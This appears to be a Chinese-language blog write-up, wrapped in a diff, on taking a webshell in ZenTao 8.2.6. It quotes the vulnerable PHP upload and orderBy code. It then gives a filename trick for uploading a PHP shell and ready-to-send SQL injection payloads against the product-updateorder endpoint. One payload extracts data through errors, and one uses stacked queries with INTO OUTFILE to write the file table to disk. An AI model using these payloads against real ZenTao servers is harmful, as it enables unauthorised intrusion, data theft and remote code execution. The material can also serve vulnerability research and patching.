@@ -1,0 +1,122 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>&gt; 之前和一个朋友一直在讨论禅道获取webshell的方法，折腾了一天左右，最后还是在命令执行的地方拿到shell的。说来也是惭愧，这两天又研究了一下，又发现了一个低版本getshell的方法，最新版本是不行的，我测试的版本是8.2.6。最新版本9.1是不行的，其它版本未测试。</p>
+<h5 data-content="1" id="b257018b37bdd68a3d6fc995b2aa1f5a">一、上传点</h5>
+<pre><code>// D:\wamp\www\zentao826\module\file\control.php
+public function ajaxUpload()
+{
+    $file = $this-&gt;file-&gt;getUpload('imgFile');
+    $file = $file[0];
+    if($file)
+    {
+        if($file['size'] == 0) die(json_encode(array('error' =&gt; 1, 'message' =&gt; $this-&gt;lang-&gt;file-&gt;errorFileUpload)));
+        if(@move_uploaded_file($file['tmpname'], $this-&gt;file-&gt;savePath . $file['pathname']))
+        {
+            /* Compress image for jpg and bmp. */
+            $file = $this-&gt;file-&gt;compressImage($file);
+
+            $file['addedBy']    = $this-&gt;app-&gt;user-&gt;account;
+            $file['addedDate']  = helper::today();
+            unset($file['tmpname']);
+            $this-&gt;dao-&gt;insert(TABLE_FILE)-&gt;data($file)-&gt;exec();
+
+            $url = $this-&gt;file-&gt;webPath . $file['pathname'];
+            die(json_encode(array('error' =&gt; 0, 'url' =&gt; $url)));
+        }
+        else
+        {
+            $error = strip_tags(sprintf($this-&gt;lang-&gt;file-&gt;errorCanNotWrite, $this-&gt;file-&gt;savePath, $this-&gt;file-&gt;savePath));
+            die(json_encode(array('error' =&gt; 1, 'message' =&gt; $error)));
+        }
+    }
+}</code></pre>
+<p>这里，我们可以用<code>burpsuite</code>抓包将文件名改为<code>xxxx.php*</code>，<code>*</code>可以是<code>{\x80-\x99}</code>。这样，我们就可以成功上传一个shell，但是<code>die(json_encode(array(&amp;#39;result&amp;#39; =&amp;gt; &amp;#39;success&amp;#39;, &amp;#39;message&amp;#39; =&amp;gt; $this-&amp;gt;lang-&amp;gt;saveSuccess)));</code>会错误而不会返回文件的地址。</p>
+<h5 data-content="1" id="5578bd4ff912d699098c35f2aa4cd167">二、SQL注入的根源</h5>
+<p>&gt; 问题出在<code>oderBy</code>函数</p>
+<pre><code>// D:\wamp\www\zentao826\lib\base\dao\dao.class.php
+public function orderBy($order)
+{
+    if($this-&gt;inCondition and !$this-&gt;conditionIsTrue) return $this;
+
+    $order = str_replace(array('|', '', '_'), ' ', $order);
+
+    /* Add "`" in order string. */
+    /* When order has limit string. */
+    $pos    = stripos($order, 'limit');
+    $orders = $pos ? substr($order, 0, $pos) : $order;
+    $limit  = $pos ? substr($order, $pos) : '';
+
+    $orders = explode(',', $orders);
+    foreach($orders as $i =&gt; $order)
+    {
+        $orderParse = explode(' ', trim($order));
+        foreach($orderParse as $key =&gt; $value)
+        {
+            $value = trim($value);
+            if(empty($value) or strtolower($value) == 'desc' or strtolower($value) == 'asc') continue;
+
+            $field = $value;
+            /* such as t1.id field. */
+            if(strpos($value, '.') !== false) list($table, $field) = explode('.', $field);
+            /* Ignore order with function e.g. order by length(tag) asc. */
+            if(strpos($field, '(') === false and strpos($field, '`') === false) $field = "`$field`";
+
+            $orderParse[$key] = isset($table) ? $table . '.' . $field :  $field;
+            unset($table);
+        }
+        $orders[$i] = join(' ', $orderParse);
+    }
+    $order = join(',', $orders) . ' ' . $limit;
+
+    $this-&gt;sql .= ' ' . DAO::ORDERBY . " $order";
+    return $this;
+}</code></pre>
+<p>&gt; 这段代码是有问题的，<code>order</code>参数经过了一些处理就直接拼接到了SQL查询语句中，但是问题在于，<strong>一些处理</strong>并没有针对安全处理。不过有下面几点可能会出现问题，具体为什么看看代码就知道了。</p>
+<ul>
+<li>最好不好出现空格</li>
+<li>最好不好出现点</li>
+<li>最好不要出现下划线</li>
+<li>
+<code>order by</code>之后不能使用<code>union</code>语句</li>
+<li>可以报错或者盲注</li>
+</ul>
+<h5 data-content="1" id="f451a2b3b62096efbc3f26051f5f2ea1">三、注入点</h5>
+<pre><code>// D:\wamp\www\zentao826\module\product\control.php
+public function updateOrder()
+{
+    $idList   = explode(',', trim($this-&gt;post-&gt;products, ','));
+    $orderBy  = $this-&gt;post-&gt;orderBy;
+    if(strpos($orderBy, 'order') === false) return false;
+
+    $products = $this-&gt;dao-&gt;select('id,`order`')-&gt;from(TABLE_PRODUCT)-&gt;where('id')-&gt;in($idList)-&gt;orderBy($orderBy)-&gt;fetchPairs('order', 'id');
+    foreach($products as $order =&gt; $id)
+    {
+        $newID = array_shift($idList);
+        if($id == $newID) continue;
+        $this-&gt;dao-&gt;update(TABLE_PRODUCT)-&gt;set('`order`')-&gt;eq($order)-&gt;where('id')-&gt;eq($newID)-&gt;exec();
+    }
+}</code></pre>
+<p>因此我们的payload就是</p>
+<pre><code>http://zentao826.me/product-updateorder.html
+POST:products=1,2&amp;orderBy=`order`and/**/polygon((select/**/*/**/from(select/**/*/**/from(select/**/user())a)b))%23</code></pre>
+<p>虽说可以盲注了，但是你会发现表名、字段名出现了下划线就不能注入了。。。</p>
+<h5 data-content="1" id="1e633404728899a2e0a237dcb83b7555">四、如果没有下划线</h5>
+<p>&gt; 没有下划线的情况，在这里盲注也是很麻烦的，在最上面，我们提到了一个上传点，但是没有办法拿到文件名。但是，如果没有下划线能不能从注入点切入呢？禅道这套系统使用的是PDO操作数据库，记得很久之前做过一道<code>CTF</code>，当时就是利用PDO可以多语句执行的特性。</p>
+<p><strong>因此这里的执行步骤就是：</strong></p>
+<ul>
+<li>现在后台上传一个文件，文件名为<code>xxxx.php\x81</code>
+</li>
+<li>利用注入写文件，把<code>file</code>表中的数据写入到文件中</li>
+<li>访问文件，得到文件名</li>
+</ul>
+<p><strong>payload如下</strong>：</p>
+<pre><code>http://zentao826.me/product-updateorder.html
+POST:products=1,2&amp;orderBy=`order`;select/**/*/**/from/**/file/**/into/**/outfile/**/'d:/2'#</code></pre>
+<p><strong>条件限制</strong>：</p>
+<ul>
+<li>MySQL当前账户有文件操作的权限</li>
+<li>禅道数据库表名无前缀</li>
+<li>至少有一个可以上传文件的后台账号</li>
+</ul>
+</div>
+</div>
